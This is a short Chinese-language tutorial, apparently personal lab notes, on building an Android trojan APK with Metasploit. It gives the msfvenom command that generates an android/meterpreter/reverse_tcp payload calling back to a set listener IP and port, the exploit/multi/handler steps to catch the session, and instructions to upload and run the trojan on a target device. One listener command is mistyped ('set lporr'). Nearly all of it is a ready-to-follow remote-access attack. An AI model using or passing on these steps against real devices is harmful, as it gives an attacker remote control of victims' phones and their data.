# 一、环境准备

1. MSF-Metasploit Framework
2. 一台安装手机或者模拟器

# 二、木马生成

1. 生成一个APK后门
2. msfvenom -p android/meterpreter/reverse_tcp LHOST={监控IP} LPORT={监控端口} R>k.apk。

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.110.38  LPORT=4567 R>k.apk

# 三、配置监控

1. 启动msf   终端内输入：msfconsole 启动msf
![[1643003592876.png]]

2. 载入监控模块  msf中输入：  use exploit/multi/handler

3. 载入payload MSF终端中输入： set payload android/meterpreter/reverse_tcp

   ![[1643003612323.png]]
4. 配置payload  MSF终端中输入：show options

5. 配置监控IP MSF中输入：set lhost  <监控的IP>

6. 配置监控端口  MSF中输入：set lporr  <监控的端口>

1. 执行监控  msf终端中输入： run
![[1643003633911.png]]

# 四、攻击利用

1. 将木马上传到靶机
2. 在靶机上执行木马
3. 完成攻击利用

![[1643003654523.png]]